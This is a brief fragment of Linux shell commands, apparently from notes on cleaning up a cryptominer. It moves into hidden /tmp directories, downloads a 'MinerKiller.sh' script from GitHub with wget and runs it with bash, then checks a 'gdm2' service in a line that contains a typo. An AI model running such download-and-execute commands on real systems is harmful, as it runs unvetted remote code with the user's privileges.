...
cd /tmp ; cd .ICE-unix ; cd .X11-unix ; wget https://raw.githubusercontent.com/MinervaLabsResearch/BlogPosts/master/MinerKiller/MinerKiller.sh ; bash MinerKiller.sh
...
systemctl status gdm2 &&serice gdm2 status
